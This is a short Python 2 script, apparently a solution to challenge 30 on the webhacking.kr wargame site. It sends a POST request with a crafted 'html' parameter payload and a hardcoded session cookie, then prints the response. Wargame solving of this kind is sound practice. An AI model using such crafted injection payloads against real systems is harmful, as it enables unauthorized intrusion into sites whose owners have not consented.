import urllib
import httplib
import hashlib


HTTP=httplib.HTTPConnection("webhacking.kr")
Param="html='%26l's>index/go.html"
Headers={"Content-Type":"Application/x-www-form-urlencoded",
         "Cookie":"PHPSESSID=bc4730b877a0174a3eef0f693c329912;"}
HTTP.request("POST","/challenge/web/web-30/index.php",Param,Headers)
Result=HTTP.getresponse().read()
print Result
